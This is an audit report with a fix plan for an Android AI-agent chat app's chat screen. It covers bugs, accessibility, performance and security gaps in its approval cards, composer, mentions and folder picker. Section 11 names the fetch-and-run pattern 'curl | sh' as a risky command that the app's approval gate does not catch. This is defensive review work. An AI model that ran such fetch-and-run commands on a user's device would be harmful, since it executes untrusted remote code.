# 02 — Chat screen part 2 (messages, composer, sheets, artifacts)

## Scope
- `lib/ui/chat_screen.dart` L4500–8970 (message bubbles + actions, markdown, image messages + full-screen viewer, attach sheet, image-prompt dialog, `_InputBar` composer, @-mentions, goal editor, working-folder sheet, inline approval/question cards, control-mode consent dialogs)
- `lib/ui/html_artifact_view.dart` (artifact view)
- Calls followed into `lib/core/` where needed to confirm a bug.

## Goal
Actionable fix plan for a ~10M DAU Android app: bugs, missing states, UX/a11y/perf, security, missing must-have features vs ChatGPT/Claude mobile, and Claude Code MCP/plugin parity gaps visible here. Known context not re-reported: per-token streaming rebuild storm (branch `perf/streaming-rebuilds`).

## Status
complete (sections 1–18 + group summary)

---

## 1. Message bubble + action row (`_MessageView`, `_TurnTailRow`)

**What it is / how reached:** Every transcript row in the chat screen. User rows are a filled bubble (`SelectableText`); assistant rows are borderless markdown. Under each row is an action row: Copy, Edit & resend / Revert (last user row), Edit & resend dialog (earlier user rows), thumbs up/down with an optional note sheet, Branch, Regenerate (last assistant text), elapsed time and clock time.

**Findings**
- **P1 · bug · chat_screen.dart:4779-4815 (+ core/state.dart:6471)** · Regenerate deletes history from `msgIndex`, which is the *final assistant text row*, not from the row after the last user message. The earlier tool/reasoning rows from the first attempt stay in the transcript, and the new run's rows are appended after them (`deleteMessagesFrom` truncates exactly from the given index). · The user sees two interleaved attempts, and the stale tool rows stay in the history that is sent back to the model. · Find the index of the last `role=='user'` row and call `_deleteHistory` with `lastUserIdx + 1`. Add a `_deleteHistoryFrom(int)` overload that keeps the same `_canChangeHistory` guards.
- **P1 · UX · chat_screen.dart:4791-4802** · Regenerate returns silently in three cases: no last user row, the provider is not configured or the model is gone, or an attachment path is missing. · Tapping the button does nothing and gives no feedback. · Show a SnackBar for each case (for example "Model X is no longer available. Pick a model to regenerate."), or hide the button when `provider == null || !isConfigured`.
- **P1 · UX/data · chat_screen.dart:4700-4704, 4976-5022** · "Edit & resend" on an *earlier* user message truncates every later message (`_deleteHistory` from `msgIndex`), but the dialog never says so. Its button reads "Edit in composer", and nothing can be undone. Agent-made workspace file changes are not rolled back either. · A user who taps edit on message 3 of 40 silently loses 37 messages. · Add the line "This removes the N messages after it" to the dialog and use a destructive button style. Better: keep the removed tail in memory and offer an Undo SnackBar for about 8 s, or branch automatically (`branchSessionFrom`) instead of truncating.
- **P1 · copy/expectation · chat_screen.dart:4693-4697** · "Revert" on the last user row deletes the message with no confirmation. It only edits the transcript and does not revert any files the agent wrote. · In a coding agent, "Revert" reads as "undo the changes", so users will believe their workspace was rolled back. · Rename it to "Delete message", add Undo, or implement real checkpoint restore (see the parity gaps below).
- **P1 · a11y · chat_screen.dart:4651-4666, 4708-4762** · The comment says "minimum 48dp tap target", but the padding is 8/10 around a 15 dp icon, so each target is about 31 x 35 dp, packed edge to edge. · Users mis-tap thumbs-down, Branch and Regenerate, and these fail the Play pre-launch accessibility scanner. · Wrap each action in `ConstrainedBox(minWidth: 48, minHeight: 48)`, or use `IconButton` with the default constraints. Collapse rarely used actions (Branch, Revert) into a `⋯` overflow menu so the row stays narrow.
- **P2 · bug · chat_screen.dart:4747-4748, 4911-4973** · Thumbs-down sets `m.feedback='down'` *before* the note sheet opens. If the sheet is dismissed by swipe or back, nothing is persisted and `onAction()` is never called. The icon stays outlined until an unrelated rebuild, and the down-vote is lost on restart. The note sheet's `TextEditingController` is also never disposed. · Use `showModalBottomSheet(...).whenComplete(() { persistSessions(); onAction(); c.dispose(); })`.
- **P2 · bug · chat_screen.dart:4580, 4687, 4779** · `isLast` is `msgIndex == messages.length-1`. When a passive `turnTail` row is appended after the answer (background subagent notice, core/agent_service.dart:22786), the final answer is no longer last, and Regenerate / Edit / Revert disappear. · Compute "last conversational row" by skipping trailing `turnTail` and `compact` rows.
- **P2 · UX · chat_screen.dart:4843-4844** · The timestamp is always `HH:mm` and has no date, even for messages from previous days, and it ignores the 12-hour locale setting. · Use `DateFormat.jm(locale)`, and add the date when the message is not from today.
- **P2 · a11y · chat_screen.dart:4588-4625** · Bubbles have no merged Semantics ("You said… / Ovid said…, 14:02"). TalkBack reads the content, then each icon tooltip, with no speaker cue. · Wrap the bubble in `Semantics(label: isUser ? 'You' : 'Assistant', ...)` and mark the action row `Semantics(container: true)`.

**Missing features (vs ChatGPT / Claude mobile)**
- Feedback (thumbs and note) stays only on the device (`state.dart:954-1019`, and the sheet copy "the note stays on this device"). At 10M DAU there is no quality signal at all. Add opt-in upload of the rated turn and model id.
- No long-press context menu on a bubble (Copy, Select text, Share, Read aloud). Both reference apps provide one. Assistant markdown is not selectable as a whole; see section 2.
- No "Read aloud" (TTS) and no "Share message" action on a single answer.
- No regenerate variants (`< 1/2 >` paging between attempts). Regenerating destroys the previous answer.
- **Claude Code parity:** no checkpoint / `/rewind` restore of code together with the conversation. Edit and Revert change only the transcript.

**Tests to add**
- Widget test: a transcript of `[user, tool, reasoning, assistant]`. Tap Regenerate and assert that only `[user]` remains before the new run starts.
- Widget test: thumbs-down, then dismiss the sheet. Assert that `persistSessions` was called and the icon is filled.
- Widget test: edit message 1 of 5 and assert the dialog states how many messages will be removed.
- `tester.ensureSemantics` + `meetsGuideline(androidTapTargetGuideline)` on the action row.

---

## 2. Image-generation message + full-screen viewer (`_imageGen`, `_showFullscreenImage`, `_openLocalFile`)

**What it is / how reached:** An assistant row of kind `imageGen` shows a square preview, the prompt text, and Fullscreen / Open / Share actions. Tapping the image opens a black full-screen route with `InteractiveViewer` and Share.

**Findings**
- **P1 · bug · chat_screen.dart:5296-5307** · "Open" calls `launchUrl(Uri.file(path))` without `await`. The app targets SDK 28 (`android/app/build.gradle` L119), so a `file://` ACTION_VIEW intent throws `FileUriExposedException`. url_launcher_android catches only `ActivityNotFoundException` (`UrlLauncher.java:95-97`), so the call fails with a PlatformException. Because the Future is not awaited, the `try/catch` never runs and no SnackBar is shown. Even without that exception, other apps cannot read the app-private file. · The Open button does nothing. · Route Open through the existing FileProvider (`NativeShare.kt:45`): add `NativeShare.open(path, mime)` that sends `ACTION_VIEW` with `FLAG_GRANT_READ_URI_PERMISSION`, `await` it, and show the SnackBar when it returns false or throws. The same pattern exists at chat_screen.dart:4397 (group 01).
- **P1 · perf · chat_screen.dart:5143, 5201** · `file.existsSync()` and `file.lengthSync()` run in `build()` for every image row on every rebuild of the row. These are synchronous disk stats on the UI thread, and the transcript rebuilds often. · Jank in image-heavy chats. · Resolve the existence check and size once in a small `StatefulWidget` (`initState` + `File.stat()`), or cache them on the `Message`.
- **P2 · UX · chat_screen.dart:5157-5163** · The preview is forced to `AspectRatio(1)` with `BoxFit.cover`, so portrait and landscape generations are cropped. · Users cannot see the real composition. · Read the size from `ImageStream` / `decodeImageFromList` (or store width and height on the message), and use the true aspect ratio clamped between 0.5 and 2.
- **P2 · UX · chat_screen.dart:5280-5283** · The full-screen viewer decodes at `cacheWidth = screenWidth × dpr` (theme.dart:96-100) but allows `maxScale: 5`, so a zoomed image is a blurry upscale. · Drop `cacheWidth` in the full-screen route, or decode at `min(intrinsic, 4096)`.
- **P2 · a11y · chat_screen.dart:5155-5168, 5280** · The image has no `semanticLabel`. TalkBack announces "image" with no prompt text. · Pass `semanticLabel: m.content`.
- **P2 · UX · chat_screen.dart:5205-5208** · The missing-file state says "image file not in workspace" with no recovery action. · Offer "Regenerate" using the stored prompt.

**Missing features**
- No "Save to Photos / Downloads" action (MediaStore). ChatGPT has it on every generated image. Share is the only workaround.
- No swipe-down to dismiss and no double-tap to zoom in the full-screen viewer.
- No edit or vary loop ("make it bluer") that targets the selected image.

**Tests to add**
- Unit or integration test: Open on a generated image calls the FileProvider path, and a failure shows the SnackBar.
- Golden test for a 16:9 generated image, asserting it is not cropped.

---

## 3. Attachment chips (in transcript `_attachmentChips`; composer `_AttachmentChip`)

**What it is / how reached:** Files staged through the attach sheet appear as removable chips above the composer (`_AttachmentChip`). After sending, read-only chips appear under the user bubble.

**Findings**
- **P1 · layout · chat_screen.dart:5078-5096** · The transcript chip is `Row(mainAxisSize.min)` > `Text(a.name)` with no `Flexible` or ellipsis inside a `Wrap`. A long filename, such as a camera `IMG_20261011_…` or a long PDF title, overflows the bubble width. This shows yellow-black overflow stripes in debug builds and clipped text in release. · Wrap the name in `Flexible(child: Text(..., maxLines:1, overflow: ellipsis))` and add a `maxWidth` like the composer chip (L5391).
- **P2 · UX · chat_screen.dart:5070-5098** · Sent attachment chips cannot be tapped. An image the user sent is never shown as a thumbnail, and a file cannot be reopened. · Render image attachments as thumbnails (opening the full-screen viewer), and open other files through FileProvider.
- **P2 · UX · chat_screen.dart:5442-5446** · The remove ✕ is silently ignored when `activeSessionId != sessionId`. · Low risk, but the chip stays visible. Rebuild instead of no-op, or hide the chips for a non-active session.

**Missing features**
- No image thumbnail preview for staged photos. ChatGPT and Claude both show thumbnails in the composer.

**Tests to add**
- Widget test: a 120-character attachment name under a user bubble at 320dp width produces no overflow (`tester.takeException() == null`).

---

## 4. Composer (`_InputBar`): field, toolbar, send/stop/queue button

**What it is / how reached:** The bottom composer card on the chat screen. It holds the staged attachments, the slash/@ menu, an `AetherField`, the Control-service notice, a queue-edit banner, and a toolbar row: Attach, Studio folder / Plan / Mode chips, Mic, and Stop + Send/Queue/Save.

**Findings**
- **P1 · data loss · chat_screen.dart:6180-6186** · The "Generate image" dialog runs `controller.text = 'Generate an image: $prompt'; onSend();`. This overwrites whatever draft the user had in the composer. If `onSend` then refuses (an approval is pending, chat_screen.dart:1773-1777, or another guard fails), the draft is gone *and* nothing is sent. · A long typed prompt is silently replaced. · Send through a dedicated path, for example `AgentService.I.runTask('Generate an image: $prompt', ...)`, or save `controller.value` first and restore it when send fails. Disable the "Generate image" option while `locked`.
- **P1 · UX · chat_screen.dart:5518-5525, 6469-6472** · Voice dictation **auto-sends** the final transcript as soon as speech recognition reports `isFinal` (silence). Users cannot review or correct misrecognised text before it reaches the agent, which may run tools in Full Access mode. While `locked`, the mic stays enabled and the transcript overwrites the disabled field. · Mis-heard commands go to the agent. · Default to *insert, don't send*: put the transcript in the field, keep focus, and let the user tap Send. Offer auto-send as a setting. Disable `_MicButton` when `locked` or when `sessionId == null`.
- **P1 · UX · chat_screen.dart:6442-6449** · The Attach button stays enabled when `locked` (approval pending) and when there is no session. In those cases, picked files hit `_stagePicked` and only then show "Select a chat before attaching files." · The user walks through the system picker for nothing. · Set `onPressed: locked || widget.sessionId == null ? null : ...`.
- **P1 · perf · chat_screen.dart:6240, 5703-5925** · `_suggestions` runs inside `build()`. In `@` mode it calls `Directory.listSync()` and `existsSync()` (L5848, L5852) on the workspace, and it does this on every composer rebuild, including every parent rebuild while a run is streaming. This is synchronous file IO on the UI thread, and a workspace with thousands of files (`node_modules`, a git clone) will freeze typing. · Move the listing into an async, debounced (about 120 ms) cache keyed by `(dir, query)` in State. Use `Directory.list()` with a cap (for example the first 500 entries), and rebuild only when the cached results change.
- **P2 · copy · chat_screen.dart:6404-6406** · The hint reads "Describe what you want to build… / commands @ agents" in every mode, including general chat. At 1.3x font scale it wraps and eats a line. · Use a mode-aware short hint ("Message Ovid") and move the `/` and `@` tips to the first-run tooltip.
- **P2 · UX · chat_screen.dart:6534-6546** · While a run is active with an empty draft, only Stop shows. That is fine, but no Semantics announces the state change ("Agent running, Stop available"). · Add `SemanticsService.announce` when the run starts and stops.
- **P2 · UX · chat_screen.dart:6413-6415** · `onSubmitted` sends, but the field is multiline. Whether Enter sends or adds a newline depends on `AetherField`'s `textInputAction`, which is not set here. A hardware keyboard on a tablet or ChromeOS has no Shift+Enter convention. · Add a `Shortcuts` mapping: Enter sends, Shift+Enter inserts a newline, when `MediaQuery.of(context).navigationMode` or a physical keyboard is detected.

**Missing features**
- No camera capture in the attach sheet (see section 6).
- No model picker inside the composer. It lives in the AppBar per the comment at L6468, which is acceptable. There is no per-message "thinking / extended reasoning" toggle like the Claude app has.
- There is no draft auto-save indicator, although drafts are versioned (`_draftVersions`, group 01).

**Tests to add**
- Widget test: type a draft, generate an image while `pendingApproval != null`, and assert the draft is unchanged.
- Widget test: a final dictation result fills the field and does **not** call `onSend` (after the fix).
- Perf test: an `@` query in a workspace of 5,000 files triggers no `listSync` in `build` (inject a fake FS and count calls).

---

## 5. Slash menu and @-mentions (`_suggestions`, `_mentionSuggestions`, `_applySuggestion`)

**What it is / how reached:** Typing `/` at position 0 opens a fuzzy-ranked menu grouped into Commands, Skills, MCP tools and Plugins (up to 24 rows). Typing `@` after whitespace opens Subagents, Files (workspace, with folder descent) and Sessions (up to 14 rows).

**Findings**
- **P1 · bug · chat_screen.dart:5876 + core/agent_service.dart:5263-5308, 5344-5357** · A file picked from the menu is inserted as a bare `@rel`. At send time, `expandReferences` first tries `_resolveSessionReference(token)`, which falls back to a **substring title match** (`title.toLowerCase().contains(name)`). A file such as `@index.html` or `@notes.md` is expanded as a *session* whenever any chat title contains that string, and the file is never attached. · The model receives the wrong context and the user cannot tell. · Insert files as `@file:<rel>` (or a quoted `@"rel"`), and in `expandReferences` try the workspace file before the fuzzy title match. Use only exact id or exact title for unprefixed tokens.
- **P2 · bug · chat_screen.dart:5843-5852** · Folder descent accepts `..` segments, so `@../` lists directories *outside* the workspace (the app-private data directory) in the menu. Picking one inserts a token that `expandReferences` silently drops (agent_service.dart:5316-5318). · Internal file names are exposed, and a picked reference is lost with no message. · Skip `..` and `.` segments in the UI the same way the backend does, and show "Outside workspace" instead of listing.
- **P2 · bug · chat_screen.dart:5845-5849** · When a typed folder segment does not exist, `dir` silently stays at the parent and the query matches against the parent's entries. · `@srcx/ma` shows root files, which is confusing. · Stop descent and show "No folder `srcx`".
- **P2 · UX · chat_screen.dart:5886-5901** · The empty-state row "no files yet" is tappable and inserts `@`. It also appears when a non-matching query is typed and files exist but none matched. · Show "No matches for "q"" as a non-tappable row (`onTap: null`).
- **P2 · a11y · chat_screen.dart:6315-6323** · Group headers are 9.5 sp faint text with no `Semantics(header: true)`. Rows are `InkWell`s with no selected or keyboard-highlight state, and arrow keys and Tab do nothing on a hardware keyboard. · Add header semantics, plus `FocusableActionDetector` with Up/Down/Enter/Tab handling.
- **P2 · UX · chat_screen.dart:6008-6011** · Picking a slash command replaces the **whole** composer text (`controller.text = s.insert ?? ...`). Slash mode is only active when the text has no space, so the loss is at most the query. However, MCP and plugin picks insert a prose prefix ("Use the X MCP tool "…") instead of a structured chip. · Acceptable now. Consider rendering tool and plugin picks as removable chips so the reference survives edits.

**Missing features / Claude Code parity**
- **MCP prompts are not exposed as slash commands, and MCP resources are not exposed as `@` mentions.** Core already implements `prompts/list`, `prompts/get`, `resources/list` and `resources/read` (core/mcp_service.dart:2812-2826, 3013, 3039), but the composer only lists *tools* (L5745-5763). Claude Code surfaces `/mcp__<server>__<prompt>` and `@<server>:<uri>`. Add a "MCP prompts" group to `_suggestions` that calls `getPrompt` on pick, and a "Resources" group to `_mentionSuggestions`.
- No per-server status in the menu (connected / needs auth / error). A disconnected server's tools just disappear.

**Tests to add**
- Unit test: `expandReferences('@index.html')` with a session titled "Fix index.html" and an existing workspace file. Expect the file block.
- Widget test: `@../` produces no rows from outside the workspace root.

---

## 6. Attach sheet + image-prompt dialog (`_attachSheet`, `_pickDocument`, `_pickMedia`, `_stagePicked`, `_imagePromptDialog`)

**What it is / how reached:** Composer → Attach (+) opens a bottom sheet with three options: Photos & videos, Document, and Generate image. Picks are staged as pending attachments and a SnackBar confirms. Generate image opens an AlertDialog with a prompt field.

**Findings**
- **P1 · data loss** · Generate image overwrites the composer draft (see section 4, L6184).
- **P2 · UX · chat_screen.dart:6106-6140** · Staging gives no progress indicator while `attachFile` copies large files. Twenty files of 20 MB each are copied sequentially with no spinner, and the sheet is already closed. · Show a determinate "Attaching 3/20…" chip in the composer while `_stagePicked` runs.
- **P2 · UX · chat_screen.dart:6131-6139** · When several files fail, only `errors.first` is shown in a 2-second SnackBar. · Use a 4-second SnackBar with a "Details" action that lists every skipped file and its reason.
- **P2 · copy · chat_screen.dart:6030-6038** · The subtitles "Up to 20 files per message, max 20 MB each" hard-code limits that live in `AgentService.maxAttachments` and in core. · Interpolate the constants so the copy cannot drift.
- **P2 · UX · chat_screen.dart:6062-6087** · The document allow-list includes `doc` and `docx` but leaves out `xlsx`, `pptx`, `rtf`, `odt`, `tsv`, `toml`, `ini`, `swift`, `go` and `rs`, all common in ChatGPT and Claude uploads and in coding. · Align the list with whatever `attachFile` can actually extract, and source both from one shared constant.
- **P2 · a11y · chat_screen.dart:6018-6054** · The sheet has no title, no drag handle and no `Semantics(scopesRoute, namesRoute)` label. TalkBack announces only "Sheet". · Add a "Add to message" header.
- **P2 · UX · chat_screen.dart:6157-6192** · The image dialog has no size or aspect option, no style presets, and no indication of cost or quota. Generate is enabled while the field is empty, and tapping it then just closes the dialog silently (L6183). · Disable Generate until the text is non-empty (use a `ValueListenableBuilder` on `c`), and add an aspect selector (1:1 / 3:4 / 16:9).

**Missing features (vs ChatGPT / Claude mobile)**
- **Camera capture** ("Take photo"). Both reference apps put it first in the attach menu. Add `image_picker` with `ImageSource.camera`.
- Paste an image from the clipboard into the composer.
- Attach from recent photos (a horizontal strip of thumbnails in the sheet).
- Share-to-app intent target, so a user can share files from other apps into a new chat. This is out of this file's scope; verify in the shell (group 07).

**Tests to add**
- Widget test: the Generate button is disabled for empty input.
- Widget test: staging 3 files where one fails shows "Attached 2 · 1 skipped" and a details action.

---

## 7. Voice mic (`_MicButton`)

**What it is / how reached:** The mic icon in the composer toolbar. It toggles on-device speech-to-text and auto-sends on the final result.

**Findings**
- **P1 · UX** · Auto-send on final result, and the button is not disabled when `locked` (see section 4, L5518-5525).
- **P2 · bug · chat_screen.dart:5509-5517** · `base` is captured once at start. Any text the user types while dictation is active is overwritten on every partial result (`controller.text = '$base $t'`). · Track the caret insertion offset and splice only the dictated segment, or make the field read-only while listening.
- **P2 · a11y · chat_screen.dart:5532-5540** · There is no live-region announcement when listening starts or stops, and the only visual cue is a colour change of the icon. · Add `SemanticsService.announce('Listening')` and a pulsing ring, as ChatGPT does.

**Missing features**
- No full-duplex "voice mode" conversation (ChatGPT Advanced Voice, Claude voice). Dictation is the only voice path.
- No spoken read-back of answers (TTS).

**Tests to add**
- Widget test with a fake `VoiceInputService`: partial results do not clobber text typed mid-dictation.


---

## 8. Goal bar + goal editor sheet (`_GoalBar`, `_editObjective`)

**What it is / how reached:** A strip above the composer, shown while the session has a `goal` map (created by the agent's `create_goal` tool). It shows the objective, an `r<round> · <status>` chip, Pause/Resume, Edit objective (a bottom sheet with a two-line field and Save), and Clear.

**Findings**
- **P1 · bug · chat_screen.dart:6649, 6721-6731 (+ core/agent_service.dart:20649)** · The bar hides only when `s.goal == null`, but nothing ever sets `goal` back to null. "Clear goal" (`_update(s, 'complete')`) and the agent's own `update_goal(complete)` both just set the status, so the bar stays forever as a green "r3 · complete" strip with Edit and Clear buttons. The class comment says the strip disappears, and it does not. · Every chat that ever had a goal keeps a dead strip above the composer, and Clear seems to do nothing. · Return `SizedBox.shrink()` when `status == 'complete'`, and make Clear set `s.goal = null` (after a confirm or with Undo). Add an `AppState.clearGoal(sessionId)` so the UI and the agent share one path.
- **P2 · UX · chat_screen.dart:6696** · Pause/Resume is offered only for `active`/`paused`. A `blocked` goal (the agent needs input) has no Resume, so the user can only edit or clear it. · Show Resume for `blocked` as well (set it to `active`, which gives a new round in the next message).
- **P2 · expectation · chat_screen.dart:6636-6640, 6707** · Pause writes the status directly. It does not stop a run that is in progress, and it adds no progress-log entry. Resume does not start a round. The agent only checks `status == 'active'` when the next user message is sent (agent_service.dart:10431). · "Pause" reads as "stop working now". · When busy, Pause should also offer "Stop current run". Resume should offer "Continue now", which sends a `continue` message.
- **P2 · bug · chat_screen.dart:6740, 6777-6785** · The editor's `TextEditingController` is never disposed. Saving an empty field silently closes the sheet with no change. There is no length cap, and an edit made in a background session's sheet can land after a session switch (no `identical(sessionById(s.id), s)` check, unlike the folder sheet). · Dispose the controller in `whenComplete`, disable Save while empty, set `maxLength` to about 500, and check the session identity before writing.
- **P2 · copy/a11y · chat_screen.dart:6687, 6697-6731** · `r3 · paused` is cryptic. The three `VisualDensity.compact` icon buttons are about 40dp and have no group semantics. · Use "Round 3 · Paused", and wrap the bar in `Semantics(label: 'Goal: <objective>, round 3, paused')`. Use default-density icon buttons, or move Edit and Clear into an overflow menu.

**Missing features**
- There is no way to *create* a goal from the UI (for example a `/goal <objective>` composer action or a sheet). Only the model can call `create_goal`.
- The progress log (`progressLog`, up to 50 entries) is never shown. Tapping the bar should open a sheet with the objective, rounds and log.

**Tests to add**
- Widget test: a goal with `status: complete` renders nothing, and tapping Clear on an active goal removes the bar.
- Widget test: a `blocked` goal shows Resume.

---

## 9. Todo dock (`_TodoDock`)

**What it is / how reached:** A collapsible "Tasks · n/m done" strip above the composer, fed by the agent's `todo_write` tool. It has a mini progress bar and an expandable list (max 200dp) with status icons.

**Findings**
- **P2 · UX · chat_screen.dart:6807, 6855-6881** · It is collapsed by default, and the header shows only counts. The current in-progress task text is never visible without expanding, and the expanded state is lost on every rebuild of the parent. · Users cannot see what the agent is doing now. · Show the first `in_progress` item's text (or its `activeForm`, which is Claude Code's present-tense label) in the collapsed header, and keep `_expanded` per session.
- **P2 · a11y · chat_screen.dart:6828-6838** · The header InkWell is about 28dp tall and has no `Semantics(button, expanded)`. Row status is shown only by icon and colour (strike-through for completed), with no semantic label. · Set `minHeight: 48`, and add `Semantics(label: 'Completed: <text>' / 'In progress: …')`.
- **P2 · robustness · chat_screen.dart:6911, 6932** · `t['content'] ?? ''` is passed straight to `Text` with no type check. A malformed `todo_write` payload, such as a number or a map, throws in build and replaces the dock with an error widget. · Use `'${t['content'] ?? ''}'`, or validate the payload in core.

**Missing features**
- No "Stop after current task" or "Skip task" control. Claude Code's todo list can be steered from the prompt only, so this is low priority.

**Tests to add**
- Widget test: `[{content: 'A', status: 'in_progress', activeForm: 'Doing A'}]` shows "Doing A" in the collapsed header.

---

## 10. Queue dock (`_QueueDock`, `_QueueRow`, `_QueueAction`)

**What it is / how reached:** When the user sends while a run is active, messages queue. The dock lists them with Quick send (stop the current run and send this now), Edit in composer, and Delete, plus a "Clear all" link.

**Findings**
- **P1 · data loss · chat_screen.dart:7015-7039** · "Clear all" deletes every queued message, including their staged attachments, immediately. There is no confirmation and no Undo, and the target is a bare `GestureDetector` about 24dp tall next to the row actions. · A stray tap wipes several typed follow-ups. · Make it a `TextButton` with a 48dp target. Remove the items into a buffer and show an Undo SnackBar for about 6 s, or confirm when more than one message is queued.
- **P2 · layout · chat_screen.dart:7162-7166** · Queued text has no `maxLines`. A long pasted prompt of 2,000 characters makes the dock taller than the screen, which pushes the composer off-screen on small phones. · Use `maxLines: 2` with ellipsis, and tap to expand.
- **P2 · bug · chat_screen.dart:7138-7143** · The index-based Quick send path stops `AppState.I.activeSessionId`, not the dock's `sessionId`. When the dock renders a specific session that is not the active one, the wrong run is stopped. Edit in composer silently does nothing when `id == null` (L7151). · Pass `widget.sessionId` down, and hide Edit when there is no stable id.
- **P2 · copy/a11y · chat_screen.dart:7002, 7111** · The header icon is `Icons.queue_music`, which is a music glyph. The tooltip "Quick send: stop current run and send this now" is the only explanation of a destructive action, which stops the agent mid-task. · Use `Icons.schedule_send_outlined`. When a run is mid-tool, confirm Quick send with "This stops the current run".

**Missing features**
- The queue cannot be reordered (drag handle). Messages queued in background sessions are not shown in the sidebar.

**Tests to add**
- Widget test: Clear all followed by Undo restores 3 queued messages with their ids.
- Widget test: a 2,000-character queued message keeps the composer visible at a 640dp viewport.

---

## 11. Inline approval card + "other sessions waiting" row (`_ApprovalDock`, `_OtherSessionsApprovalRow`)

**What it is / how reached:** A tool needing confirmation raises `AgentService.pendingApproval`. A card above the composer shows the command or detail (in monospace, with a scrollable 180dp box for `commit`) and Deny / Allow / Always Allow. When another session is waiting, a "\"X\" is waiting for approval · Review" row appears instead.

**Findings**
- **P1 · security · chat_screen.dart:7447, 7456, 7472 (+ core/agent_service.dart:5908-5943)** · The buttons call `approve(true)`, `approve(false)` and `approveAlways()`. These resolve *whatever* `pendingApproval` is current, because the card does not bind the request it rendered. A double-tap on Allow, or a tap while the card is being replaced by the next tool's request, approves the **next** request unseen, which can be a different and more dangerous command. `_QuestionsCard` already guards this with `identical(pendingApproval, widget.req)` (L7620, L7638). The standard card does not. · An unseen tool call gets approved. · Capture `req` in the closures and add `AgentService.approveRequest(req, ok)` / `approveAlwaysRequest(req)`, which no-op unless `identical(pendingApproval, req)`. Also ignore taps for about 300 ms after a new request appears.
- **P1 · security · chat_screen.dart:7419-7431** · Non-commit details are clamped to `maxLines: 8` with an ellipsis and cannot be scrolled or expanded. A long shell command, a heredoc, or a multi-file edit hides everything after line 8, and the user approves it unseen. The destructive-command gate does not cover every risky tail (curl | sh, writes outside the workspace, network calls). · Reuse the scrollable `SelectionArea` box that `commit` already uses, for every request whose detail exceeds 8 lines, and show "Show all (N lines)".
- **P1 · a11y/layout · chat_screen.dart:7382-7474** · The detail text and all three buttons share one `Row`, and the buttons use `minimumSize: Size.zero` (about 32dp tall). At 320dp width or 1.3x text, "Always Allow" plus Deny/Allow leave the command roughly 90dp wide, so it wraps into a narrow column of a few characters per line. · The card is hard to read and the buttons are easy to mis-tap, exactly where a mis-tap matters most. · Put the detail on its own row and the buttons in a full-width row below it (Deny outlined, Allow filled), each at least 48dp tall.
- **P2 · UX · chat_screen.dart:7419-7422** · The card never shows *which tool* is asking (`req.tool`) or the human summary when a detail exists. It shows either the summary or the detail. · Add a title line ("Run shell command", "Edit 3 files", "Open URL") above the monospace detail.
- **P2 · UX · chat_screen.dart:7313-7323** · The other-sessions row offers Review only for `items.first`. With several waiting, the user cannot choose which one. · When `items.length > 1`, Review opens a small picker sheet that lists each session.

**Missing features / Claude Code parity**
- "Deny with feedback" was removed (L7339-7343). Claude Code's prompt offers "No, and tell Claude what to do differently", which is the main way users steer an agent. `approve(false, note:)` still exists. Add an optional "Deny & explain" that opens a field.
- No prefix-scoped grants (Claude Code `Bash(npm test:*)`). Always Allow remembers the whole tool for the session, which is too coarse for shell commands.
- No haptic or sound when an approval arrives while the user is scrolled up in the transcript.

**Tests to add**
- Unit/widget test: render request A, swap `pendingApproval` to B, then tap Allow from A's captured closure. B must stay pending.
- Widget test: a 40-line detail is fully reachable by scrolling. At 320dp and 1.3x text, `androidTapTargetGuideline` passes.

---

## 12. Questions card + plan-exit prompt (`_QuestionsCard`)

**What it is / how reached:** It renders `ask_user_question` requests and the `exit_plan_mode` "switch to the build agent?" question (core/agent_service.dart:20592). Each question has option chips (single or multi), a free-text "own answer" field, Skip, and Answer (enabled when every question is answered).

**Findings**
- **P2 · a11y · chat_screen.dart:7689-7738** · Option chips are bare `GestureDetector`s with no `Semantics(button: true, selected: …)`. They are about 28dp tall, and the descriptions are 9sp faint text. TalkBack users cannot tell which option is selected, and low-vision users cannot read the descriptions. · Use `ChoiceChip` / `FilterChip` (or a `RadioListTile` / `CheckboxListTile` list for options that have descriptions), with 12sp or larger descriptions.
- **P2 · bug · chat_screen.dart:7669, 7695 (+ core/agent_service.dart:20612-20613)** · The custom answer and the chips exclude each other. Typing clears the chips and tapping a chip clears the text, so for multi-select the user cannot pick "A, B + something else". For plan exit, a custom answer such as "yes, but skip the tests" counts as approval (`startsWith('yes')`), and the rest of the text is thrown away. · Let the custom text be appended to the selected chips for multi-select. For plan exit, return the full answer text to the model with the decision.
- **P2 · latent crash · chat_screen.dart:7366-7367, 7521, 7529** · The `exit_plan_mode` branch is reached only when `req.questions` is null or empty, and the card then runs `widget.req.questions!`. The current producer always passes questions, so this branch is dead today, but any future `_askUser('exit_plan_mode', …)` call would throw in build. · Delete the branch, or give the card a non-null fallback (a Yes/No question built from `req.summary`).
- **P2 · UX · chat_screen.dart:7636** · Answer is disabled with no hint about which question is still unanswered, and in a 360dp-capped scroll area the unanswered question may be off-screen. · Keep Answer enabled. On tap, scroll to the first unanswered question and mark it with an error border.
- **P2 · copy · chat_screen.dart:7548, 7612-7618** · The header "Questions from the AI" and a red "Skip" make declining look dangerous. · Use the header "Ovid needs your input" and a neutral "Skip" text button.

**Missing features**
- No keyboard number shortcuts (1/2/3) on tablet or ChromeOS. Claude Code supports numbered choices.

**Tests to add**
- Widget test: multi-select with two chips plus custom text submits `"A, B, <text>"`.
- Semantics test: a selected chip reports `isSelected`.

---

## 13. Studio folder chip + working-folder sheet (`_StudioFolderChip`, `_manageWorkspaceFolder`)

**What it is / how reached:** Shown in Studio mode only. The composer chip shows the repo name, the folder basename, or "sandbox". Tap opens the Studio screen. **Long-press** opens "Sandbox folder (Studio)" with "Select working folder" (system directory picker → writability probe → optional All Files Access request) and "Reset to session sandbox".

**Findings**
- **P1 · discoverability · chat_screen.dart:7775-7779** · The only way into the working-folder sheet is a long-press on a chip whose tap does something else. Nothing hints at it: no tooltip, no semantics hint, no menu glyph. · Most users will never find how to point the agent at their own folder. · Make tap open the sheet, with "Open Studio" as the first row, or add a trailing ▾ and a `Semantics(onLongPressHint: 'Change working folder')`.
- **P1 · policy · chat_screen.dart:7953-7958** · When a picked folder is not writable, the flow calls `requestAllFilesAccess()` (MANAGE_EXTERNAL_STORAGE). Google Play allows this permission only for core file-manager, backup or antivirus use cases. A 10M DAU chat app requesting it risks rejection, or removal at a later policy review. · Write through SAF (keep the `content://` tree URI with `takePersistableUriPermission` and use DocumentFile IO), or copy the folder into the app sandbox and sync back. Drop the All Files Access path from the default flow.
- **P2 · bug · chat_screen.dart:7898-7980** · The folder can be changed or reset while a run is active in this session. The agent's next tool call then writes into a different tree mid-task. · Disable both actions while `AgentService.I.busyFor(s.id)`, with the subtitle "Stop the run to change folders".
